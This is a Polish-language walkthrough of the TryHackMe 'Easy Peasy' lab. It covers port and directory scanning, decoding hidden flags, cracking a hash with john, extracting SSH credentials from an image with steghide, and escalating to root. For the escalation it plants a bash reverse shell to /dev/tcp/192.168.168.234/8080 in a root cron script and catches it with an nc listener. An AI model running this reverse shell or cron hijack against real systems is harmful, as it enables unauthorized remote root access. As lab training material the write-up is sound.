
# TryHackMe „Easy Peasy”

## 1. Informacje ogólne
- **Cel testów:**  
  Maszyna która prowadzi przez podstawowe techniki enumeracji, steganografii i prostych form łamania haseł.  

---

## 2. Metodologia: 
 **Narzędzia:** Nmap, burpsuit , wtyczka ff user-agent switcher , steghide , binwalk , zpi2john , john , strona tineye

## 3. Podsumowanie zadania
  **Skanowanie wstępne:**  
   
Na początku wykonano pełne skanowanie portów oraz usług, aby ustalić, jakie komponenty są dostępne na maszynie.

### Narzędzie:
**nmap*:*

```bash
sudo nmap -sV -sC -p- -A 10.80.178.106
```

### Enumeracja katalogów:  

W celu odnalezienia ukrytych zasobów wykonano skanowanie katalogów.

**Narzędzia:** gobuster

```bash
gobuster dir -u http://10.82.159.144 -w /usr/share/dirb/wordlists/common.txt
```

### Analiza źródła strony:   

W kodzie źródłowym strony znaleziono zakodowany ciąg znaków (base64). Po dekodowaniu w CyberChef uzyskano pierwszą flagę.

**Kolejne strony i hash SHA‑256**  

Na następnych podstronach pojawił się hash SHA‑256. Do jego złamania wykorzystano listę haseł pobraną z maszyny THM.

**Narzędzie:** john Komenda:

```bash
john --format=gost --wordlist=easypeasy.txt hash.txt
```

### Analiza obrazu:  

Na jednej ze stron znajdowało się zdjęcie, które zapisano lokalnie i poddano analizie.

**Narzędzie:** steghide Komenda:  

```bash
steghide extract -sf bin.jpeg
```
W wyniku ekstrakcji otrzymano dane logowania do SSH.   
Hasło było zapisane w formie binarnej — po dekodowaniu w CyberChef uzyskano poprawne dane dostępowe.  

### Dostęp przez SSH:  

Po zalogowaniu się na maszynę zdalną przeanalizowano dostępne pliki. W jednym z nich znajdowała się flaga zakodowana ROT13 — dekodowanie wykonano w CyberChef.  

### Analiza zadań cyklicznych:  

Sprawdzono harmonogram zadań systemowych:

```bash
cat /etc/crontab
```
W pliku znajdował się skrypt wykonywany z uprawnieniami administratora:

```bash
#!/bin/bash
# i will run as root
```
To wskazywało na możliwość wykorzystania błędnej konfiguracji.  

### Reverse shell:  

Reverse shell to mechanizm komunikacji, w którym:  
- zdalna maszyna inicjuje połączenie do innej maszyny  
- połączenie wychodzi „na zewnątrz”, więc łatwiej przechodzi przez firewalle  
- po zestawieniu połączenia można wykonywać polecenia jak w normalnej powłoce  

### Różnica:  

- bind shell — Ty łączysz się do zdalnej maszyny  
- reverse shell — zdalna maszyna łączy się do Ciebie  

### Reverse shell w bash:  

W skrypcie wykonywanym przez system można było umieścić polecenie reverse shell.  

Przykład polecenia wysyłającego:  

```bash
bash -c 'bash -i >& /dev/tcp/192.168.168.234/8080 0>&1'
```
Odbieranie połączenia lokalnie:

```bash
nc -lvnp 8080
```
Po zapisaniu polecenia w pliku .sh wykonywanym przez system i uruchomieniu nasłuchu uzyskano dostęp z uprawnieniami administratora, co pozwoliło zdobyć ostatnią flagę.  
CVE‑2019‑14287 Mechanizm błędnej interpretacji identyfikatora użytkownika.  
